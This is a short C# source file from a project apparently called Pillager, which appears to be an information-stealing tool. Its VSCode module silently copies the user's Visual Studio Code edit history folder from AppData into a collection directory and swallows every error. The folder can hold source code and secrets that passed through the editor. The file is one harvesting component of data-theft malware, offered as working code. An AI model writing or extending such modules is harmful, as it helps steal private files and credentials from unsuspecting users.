using System;
using System.IO;
using Pillager.Helper;

namespace Pillager.Softwares
{
    internal class VSCode : ICommand
    {
        public override void Save(string path)
        {
            try
            {
                string historypath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code\\User\\History");
                if (!Directory.Exists(historypath)) return;
                string savepath = Path.Combine(path, "VSCode");
                Directory.CreateDirectory(savepath);
                Methods.CopyDirectory(historypath, Path.Combine(savepath, "History"), true);
            }
            catch { }
        }
    }
}
